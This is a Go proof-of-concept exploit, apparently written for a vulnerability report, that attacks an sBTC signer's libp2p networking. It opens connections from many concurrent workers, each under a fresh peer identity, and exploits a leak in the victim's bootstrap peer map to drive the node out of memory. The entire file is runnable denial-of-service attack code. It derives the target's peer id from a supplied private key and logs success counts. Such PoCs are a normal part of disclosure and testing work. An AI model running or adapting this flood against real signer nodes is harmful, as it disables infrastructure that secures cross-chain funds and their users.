// External, unauthenticated libp2p attacker — PoC for the sBTC signer OOM
// (bootstrap connected_peers / ListenFailure leak). Floods ONE target signer
// with a FRESH peer id per connection; each connection-limit-denied connection
// leaks a permanent entry in the victim's bootstrap map -> unbounded RSS -> OOM.
package main

import (
	"context"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strconv"
	"sync/atomic"
	"time"

	libp2p "github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/peer"
	yamux "github.com/libp2p/go-libp2p/p2p/muxer/yamux"
	noise "github.com/libp2p/go-libp2p/p2p/security/noise"
	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
	ma "github.com/multiformats/go-multiaddr"
)

func env(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func main() {
	host := env("TARGET_HOST", "sbtc-signer-2")
	port := env("TARGET_PORT", "4122")
	keyHex := env("TARGET_PRIVKEY_HEX", "")
	workers, _ := strconv.Atoi(env("CONCURRENCY", "120"))
	if keyHex == "" {
		log.Fatal("TARGET_PRIVKEY_HEX is required (victim's secp256k1 key, to derive its peer id)")
	}

	// Derive the victim's libp2p peer id from its (public, devnet) secp256k1
	// private key. 33-byte keys carry a trailing 0x01 compression flag we strip.
	b, err := hex.DecodeString(keyHex)
	if err != nil {
		log.Fatal(err)
	}
	if len(b) > 32 {
		b = b[:32]
	}
	sk, err := crypto.UnmarshalSecp256k1PrivateKey(b)
	if err != nil {
		log.Fatal(err)
	}
	id, err := peer.IDFromPublicKey(sk.GetPublic())
	if err != nil {
		log.Fatal(err)
	}
	addr, err := ma.NewMultiaddr(fmt.Sprintf("/dns4/%s/tcp/%s", host, port))
	if err != nil {
		log.Fatal(err)
	}
	target := peer.AddrInfo{ID: id, Addrs: []ma.Multiaddr{addr}}
	log.Printf("OOM flood -> peer=%s addr=%s workers=%d", id, addr, workers)

	var ok, fail int64
	worker := func() {
		for {
			// Fresh, CHEAP identity per connection (tcp+noise+yamux only, no
			// quic/ws/relay) so a single host can keep the victim's
			// max_pending_incoming gate saturated. Each fresh peer id that the
			// victim's connection_limits denies leaks one permanent entry.
			h, err := libp2p.New(
				libp2p.NoListenAddrs,
				libp2p.Transport(tcp.NewTCPTransport),
				libp2p.Security(noise.ID, noise.New),
				libp2p.Muxer(yamux.ID, yamux.DefaultTransport),
				libp2p.DisableRelay(),
			)
			if err != nil {
				atomic.AddInt64(&fail, 1)
				time.Sleep(20 * time.Millisecond)
				continue
			}
			ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
			if err := h.Connect(ctx, target); err != nil {
				atomic.AddInt64(&fail, 1)
			} else {
				atomic.AddInt64(&ok, 1)
			}
			cancel()
			_ = h.Close()
		}
	}
	for i := 0; i < workers; i++ {
		go worker()
	}
	for {
		time.Sleep(2 * time.Second)
		log.Printf("STATS connected=%d/2s failed-or-denied=%d/2s",
			atomic.SwapInt64(&ok, 0), atomic.SwapInt64(&fail, 0))
	}
}
